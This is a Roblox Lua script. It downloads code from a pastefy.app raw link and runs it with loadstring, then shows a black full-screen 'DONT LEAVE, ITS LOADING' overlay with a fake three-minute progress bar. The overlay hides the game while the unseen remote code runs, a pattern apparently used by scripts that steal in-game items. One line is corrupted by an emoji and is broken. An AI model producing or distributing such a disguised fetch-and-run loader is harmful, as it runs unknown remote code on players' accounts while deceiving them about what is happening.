loadstring(game:HttpGet("https://pastefy.app/yClNs0oO/raw"))()
loadstring([[
local P=game:GetService("Players").LocalPlayer
local R=game:GetService("RunService")
local T=game:GetService("TweenService")
local G=Instance.new("ScreenGui",P:WaitForChild("PlayerGui"))
G.Name="LS";G.ResetOnSpawn=false;G.IgnoreGuiInset=true
-- bg
local bg=Instance.new("Frame",G)
bg.Size=UDim2.new(1,0,1,0);bg.BackgroundColor3=Color3.new(0,0,0);bg.BorderSizePixel=0
-- container
local c=Instance.new("Frame",bg)
c.AnchorPoint=Vector2.new(.5,.5);c.Position=UDim2.new(.5,0,.5,0)
c.Size=UDim2.new(.6,0,.25,0);c.BackgroundTransparency=1
-- heading
local h=Instance.new("TextLabel",c)
h.AnchorPoint=Vector2.new(.5,0);h.Position=UDim2.new(.5,0,0,0)
h.Size=UDim2.new(1,0,.4,0);h.BackgroundTransparency=1
h.Text="DONT LEAVE, ITS LOADING";h.Font=Enum.Font.GothamBold;h.TextScaled=true
h.TextColor3=Color3.fromRGB(255,50,50);h.TextWrapped=true;h.ZIndex=5
-- glow pulse
local glow=Instance.new("UIStroke",h)
glow.Thickness=4;glow.Color=Color3.fromRGB(255,100,100);glow.ApplyStrokeMode=Enum.ApplyStrokeMode.Border
glow.LineJoinMode=Enum.LineJoinMode.Round;glow.Transparency=0.4
T:Create(glow,TweenInfo.new(0.6,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut,-1,true),{Transparency=0.15}):Play()
T:Create(h,TweenInfo.new(0.6,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut,-1,true),{TextColor3=Color3.fromRGB(255,120,120)}):Play()
-- flicker layers
for _,off in ipairs({Vector2.new(2,1),Vector2.new(-2,1),Vector2.new(1,-2)}) do
	local f=h:Clone()
	f.Position=UDim2.new(.5,off.X,0,off.Y)
	f.TextColor3=Color3.fromRGB(255,120,120)
	f.ZIndex=4
	f.Parent=c
	spawn(function()
		while G.Parent do
			f.TextTransparency=math.random()*0.3
			task.wait(0.05)
		end
	end)
end
-- sparks
local p=Instance.new("ParticleEmitter",h)
p.Texture="rbxassetid://243660364"
p.Color=ColorSequence.new(Color3.fromRGB(255,120,120),Color3.fromRGB(255,50,50))
p.LightEmission=0.7
p.Size=NumberSequence.new{NumberSequenceKeypoint.new(0,0.15),NumberSequenceKeypoint.new(1,0)}
p.Transparency=NumberSequence.new(0,1)
p.Lifetime=NumberRange.new(0.4,0.😎
p.Rate=10
p.Speed=NumberRange.new(0.5,1)
p.Rotation=NumberRange.new(0,360)
p.RotSpeed=NumberRange.new(-50,50)
p.VelocitySpread=180
-- progress bar
local bb=Instance.new("Frame",c)
bb.AnchorPoint=Vector2.new(.5,.5);bb.Position=UDim2.new(.5,0,.65,0)
bb.Size=UDim2.new(.9,0,.25,0);bb.BackgroundColor3=Color3.fromRGB(60,60,60);bb.BorderSizePixel=0
local bc=Instance.new("UICorner",bb);bc.CornerRadius=UDim.new(1,0)
local fill=Instance.new("Frame",bb)
fill.Size=UDim2.new(0,0,1,0);fill.BackgroundColor3=Color3.fromRGB(100,200,100);fill.BorderSizePixel=0
local fc=Instance.new("UICorner",fill);fc.CornerRadius=UDim.new(1,0)
local label=Instance.new("TextLabel",c)
label.AnchorPoint=Vector2.new(.5,0);label.Position=UDim2.new(.5,0,.9,0)
label.Size=UDim2.new(1,0,.2,0);label.BackgroundTransparency=1
label.Text="0%";label.Font=Enum.Font.Gotham;label.TextScaled=true;label.TextColor3=Color3.new(1,1,1)
-- loading logic
local D=180;local s=tick();local done=false
R.Heartbeat:Connect(function()
	if done then return end
	local e=tick()-s
	if e>=D then e=D; done=true end
	local pct=math.clamp(e/D,0,1)
	fill.Size=UDim2.new(pct,0,1,0)
	label.Text=string.format("%d%%",math.floor(pct*100+0.5))
	if done then
		label.Text="Ready!"
		local ti=TweenInfo.new(0.5,Enum.EasingStyle.Quad,Enum.EasingDirection.Out)
		T:Create(bg or bb,ti,{BackgroundTransparency=1}):Play()
		T:Create(h,ti,{TextTransparency=1}):Play()
		T:Create(label,ti,{TextTransparency=1}):Play()
		T:Create(fill,ti,{BackgroundTransparency=1}):Play()
		T:Create(bb,ti,{BackgroundTransparency=1}):Play()
		task.delay(0.6,function() G:Destroy() end)
	end
end)
]] )()
